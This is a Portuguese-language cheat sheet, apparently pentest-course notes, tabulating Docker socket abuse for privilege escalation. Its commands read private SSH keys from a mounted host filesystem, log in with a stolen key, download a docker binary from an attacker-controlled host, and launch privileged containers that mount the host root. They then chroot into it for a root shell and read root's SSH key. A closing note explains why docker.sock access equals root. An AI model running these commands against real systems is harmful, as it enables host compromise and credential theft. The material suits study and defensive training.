# Docker Commands

| Comando | Para que serve | Resultado esperado |
|---|---|---|
| `cd /hostsystem/home/cry0l1t3` | Navegar até um diretório do host montado dentro do container, enumerando pastas de usuários | Diretório alterado com sucesso |
| `ls -l` | Listar arquivos e permissões do diretório atual, procurando arquivos sensíveis (ex.: `.ssh`, `.bash_history`) | Listagem de arquivos com dono, grupo e permissões |
| `cat .ssh/id_rsa` | Ler o conteúdo de uma chave SSH privada encontrada no filesystem do host montado | Conteúdo da chave privada RSA exibido (`-----BEGIN RSA PRIVATE KEY-----...`) |
| `ssh cry0l1t3@<host IP> -i cry0l1t3.priv` | Usar a chave SSH privada roubada para autenticar como o usuário dono da chave no sistema host | Sessão SSH autenticada como `cry0l1t3` |
| `ls -al` | Listar arquivos ocultos e permissões de um diretório, procurando pelo socket do Docker (`docker.sock`) | Listagem mostrando o socket, ex.: `srw-rw---- 1 root root 0 ... docker.sock` |
| `wget https://<parrot-os>:443/docker -O docker` | Baixar o binário `docker` (client) de um servidor externo, caso ele não esteja disponível no alvo | Arquivo `docker` salvo localmente |
| `chmod +x docker` | Tornar o binário `docker` baixado executável | Permissão de execução adicionada ao arquivo |
| `/tmp/docker -H unix:///app/docker.sock ps` | Listar containers em execução, conectando ao socket do Docker exposto | Tabela com containers ativos, imagem, comando, status, portas e nomes |
| `/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app` | Criar e iniciar (em background) um novo container privilegiado, usando uma imagem já existente (`main_app`) e montando o `/` do host em `/hostsystem` | Container criado e rodando, ID retornado (ex.: `7ae3bcc818af`) |
| `/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash` | Entrar interativamente no container privilegiado recém-criado | Shell interativo aberto dentro do container, como root |
| `cat /hostsystem/root/.ssh/id_rsa` | Ler a chave SSH privada de root do host, agora acessível via `/hostsystem` dentro do container privilegiado | Conteúdo da chave privada de root exibido |
| `id` | Verificar se o usuário atual pertence ao grupo `docker` (pré-requisito para abusar do Docker sem sudo) | Lista de grupos, ex.: `groups=1000(docker-user),116(docker)` |
| `docker image ls` | Listar imagens Docker disponíveis localmente no host, mesmo sem conexão à internet | Tabela com repositório, tag, image ID, data de criação e tamanho |
| `docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash` | Criar container interativo a partir da imagem `ubuntu`, montar `/` do host em `/mnt`, e trocar a raiz do processo (`chroot`) para `/mnt` antes de iniciar o `bash` — tudo em um único comando | Shell root interativo, já operando sobre o filesystem real do host |
| `docker -H unix:///run/docker.sock run --rm -it --privileged -v /:/hostsystem ubuntu chroot /hostsystem bash` | Variação do comando acima: cria container privilegiado, interativo, monta `/` do host em `/hostsystem` e já aplica `chroot` + `bash` no mesmo comando, evitando o problema de o container morrer sozinho por falta de TTY | Shell root interativo aberto diretamente no filesystem do host, sem precisar de `ps`/`exec` separados |

## Observação
O ponto-chave em todos os cenários é o acesso ao **Docker socket** (`docker.sock`), seja via bind mount dentro de um container (`/app/docker.sock`), seja diretamente no host (`/var/run/docker.sock` ou `/run/docker.sock`). Quem consegue falar com esse socket consegue instruir o daemon — que roda como root — a criar containers privilegiados com o filesystem do host montado, obtendo efetivamente acesso root ao host.
